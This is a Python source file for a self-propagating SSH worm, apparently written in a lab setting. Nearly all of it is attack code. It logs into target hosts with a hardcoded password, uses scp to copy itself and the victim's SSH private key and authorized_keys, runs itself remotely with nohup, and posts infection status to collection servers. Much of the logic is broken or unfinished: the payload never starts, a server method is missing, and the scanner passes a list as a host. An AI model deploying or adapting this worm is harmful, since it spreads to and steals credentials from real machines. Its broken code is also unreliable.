import subprocess
import socket
import sys
import pty
import select
import os
import requests
import time
import _thread

PROMPT = "[worm]"
USER = "admin"
PASS = "hacklab"
PATH = "/home/admin/.local/share/applications/"
DESKTOP_PATH = "/home/admin/Desktop/"

class BackgroundColours:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'

class Authentication():

    def __init__(self):
        self.fd = "" # file descriptor

    def _waitfor(self, fd, expected):
        # create a polling object
        poll = select.poll()
        # poll from the fd stream
        poll.register(fd, select.POLLIN)
        while True:
            # poll for output
            evt = poll.poll()
            # read the output
            out = os.read(fd, 1024)
            # for each expected response
            for str in expected:
                # if this response was expected
                if str.encode("utf-8") in out:
                    # return the response
                    return str    
                    
    def ssh_Auth(self, fd):
        waiting = True
        while waiting:
            # get the console output
            response = self._waitfor(fd, ["continue","connected", "password"])
            
            # if yes/no dialogue option
            if response in ["connected", "continue"]:
                # say yes
                os.write(fd, "yes\n".encode("utf-8"))

            # else if asking for the password
            elif response == "password":
                # enter the password
                os.write(fd, (PASS + "\n").encode("utf-8"))
                # get out of the loop
                waiting = False

        _, exit_status = os.wait()
        # close the stream
        os.close(fd)

    def scp_file(self, host, filename, path):
        pid, fd = pty.fork()
        # executed in child
        if pid == 0:
            # copy the file to the destination
            os.execvp("scp", ["scp", filename, USER+"@"+host+":"+path])

        # executed in parent
        elif pid > 0:
            # authorise the ssh session
            self.ssh_Auth(fd)

class Payload():

    def __init__(self):
        self.ip = ""
        self.parent_ip = ""

    def run(self):
        try:
            _thread.start_new_thread(self.visual, ())
            _thread.start_new_thread(self.post, ())
            _thread.start_new_thread(self.server, ())
        except:
            print("unable to start threads :(")

        while True:
            time.sleep(10)
            pass
            
    #threads started in dump()

    def visual(self):
        # visual worm 
        subprocess.run(["touch", "worm".format(DESKTOP_PATH, str)])

    def post(self):
        # run in the background
        time.sleep(3)
        # inform server that this host is infected
        try:
            myjson = {'ip': '10.0.0.12', 'parent_ip': '0'}
            requests.post("http://127.0.0.1:8000/api/worms/", data = myjson)
        except:
            pass            
    
    # work in progress
    def scanner(self):
        to_infect = ["10.0.0.30"]

        while True:
            for host in to_infect:
                try:
                    print("checking " + host + " if already infected")
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, 6969))
                    s.sendall(b"hello")
                    response = s.recv(1024)
                    print("it is infected")
                    if response:
                        try:
                            requests.post("http://10.0.0.31:9000/", data = {'status':response})
                        except:
                            pass
                except Exception as e:
                    print(e)
                    print("infecting")
                    #dunno what below does
                    subprocess.run(["python3", "worm.py", "infect", host])
                    time.sleep(10)
            time.sleep(10)
            return(to_infect)
        
    def server_thread(self, conn):
        while True:
            data = conn.recv(1024)
            if not data:
                break
            # whenever data is recieved, send "infected"
            conn.sendall(b"infected")
    
    def payload_server(self, conn):
        # create an INET, STREAMing socket
        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # bind the socket to a port
        serversocket.bind((socket.gethostname(), 6969))
        # become a server socket
        serversocket.listen()
        while True:
            conn, host = serversocket.accept()
            # connection recieved, start a new thread
            _thread.start_new_thread(self.server_thread(conn), (conn,))

class worm():
    
    def __init__(self):
        self.auth = Authentication()

    #infect
    def infect(self, target):
        PROMPT = "[" + target + "]"

        print(BackgroundColours.OKBLUE + PROMPT, "propagating to", target, BackgroundColours.ENDC)

        # copy the worm file
        print(PROMPT, "Copying worm")
        self.auth.scp_file(target, "worm.py", PATH)

        # copy the ssh private key
        print(PROMPT, "Copying private key")
        self.auth.scp_file(target, "/home/admin/.ssh/id_rsa", "/home/admin/.ssh/")

        # copy the ssh public key
        print(PROMPT, "Copying public key")
        self.auth.scp_file(target, "/home/admin/.ssh/id_rsa.pub", "/home/admin/.ssh/authorized_keys")

        print(BackgroundColours.OKGREEN + PROMPT, "All files successfully transferred", BackgroundColours.ENDC)

        # run the worm
        print(PROMPT, "Executing on", target)
        self.execute(target)

        print(BackgroundColours.OKGREEN + PROMPT, "worm running on", target, BackgroundColours.ENDC)

    #excecute
    def execute(self, host):
        # run the worm on the target
        #need to change below, idk in what way tho
        subprocess.run(["ssh", USER+"@"+host, "nohup", "python3", PATH + "worm.py payload", ">", "/dev/null", "2>&1", "&"])

    #remove
    def remove(self, target):
        PROMPT = "[" + target + "]"

        # kill the worm process
        print(PROMPT, "Killing worm process")
        subprocess.run(["ssh", USER+"@"+target, "kill", "$(", "ps", "-e", "aux", "|", "grep", "[p]ayload", "|", "awk", "'{print $2}'", ")"])

        # remove all files
        print(PROMPT, "Removing all files")
        subprocess.run(["ssh", USER+"@"+target, "rm", DESKTOP_PATH+"*.wrm", PATH+"worm.py", "/home/admin/.ssh/*"])
        pass
        
def main():
    #eeeeeeeeee
    wormClass = worm()
    payloadClass = Payload()
    #next target is found by scanner ?
    target = payloadClass.scanner()
    #passed to worm class to infect that host and run
    wormClass.infect(target)
    # ^ this runs worm.execute(), which runs payload.run(), which starts threads for payload.post(), payload.server(), and payload.visual
    
if __name__ == "__main__":

    if len(sys.argv) < 2:
        print(PROMPT, "need an argument")
    elif sys.argv[1] == "payload":
        Payload()
    elif sys.argv[1] == "remove" and len(sys.argv) == 3:
        worm().remove(sys.argv[2])
    elif sys.argv[1] == "infect" and len(sys.argv) == 3:
        worm().infect(sys.argv[2])
